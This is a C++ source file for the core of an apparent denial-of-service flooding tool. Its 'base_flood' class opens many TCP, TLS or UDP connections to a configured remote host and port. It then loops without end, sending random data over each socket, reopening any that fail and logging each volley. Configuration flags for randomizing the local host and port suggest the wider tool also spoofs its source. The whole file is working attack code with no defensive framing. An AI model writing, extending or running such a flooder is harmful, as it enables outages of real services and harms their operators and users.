#include "base_flood.hpp"
#include "ssocket.hpp"
#include "utils.hpp"

base_flood::base_flood(int sock_type) : sock_type{sock_type} {}

int base_flood::gen_hdr(std::string &string) {
  utils::randomizer::randomstr(string);
  return static_cast<int>(string.length());
}

void base_flood::init_sockets(std::vector<std::unique_ptr<Socket>> &sockets) {
  sockets.reserve(Config::get().conn);
  if (Config::get().tls && sock_type == SOCK_DGRAM)
    spdlog::get("logger")->error("tls is not available on udp");
  if (Config::get().rand_lhost)
    spdlog::get("logger")->error(
        "local host randomization is not available on normal sockets");
  if (Config::get().rand_lport)
    spdlog::get("logger")->error(
        "local port randomization is not available on normal sockets");
  for (unsigned int i = 0; i < Config::get().conn; ++i) {
    sockets.emplace_back([&]() -> Socket * {
      if (Config::get().tls && sock_type == SOCK_STREAM) {
        return new Ssocket(Config::get().rhost, Config::get().rport);
      } else {
        return new Socket(Config::get().rhost, Config::get().rport, sock_type);
      }
    }());
  }
}

void base_flood::run() {
  std::vector<std::unique_ptr<Socket>> sockets{};
  std::string hdr{};
  int len = 0;
  init_sockets(sockets);

  while (true) {
    for (auto &socket : sockets) {
      if (!socket->Alive())
        socket->Open();
      len = gen_hdr(hdr);
      if (socket->Write(hdr.c_str(), len) == -1) {
        socket->Close();
        socket->Open();
      }
      spdlog::get("logger")->info("Voly Sent");
    }
    utils::pause(Config::get().dly);
  }
}
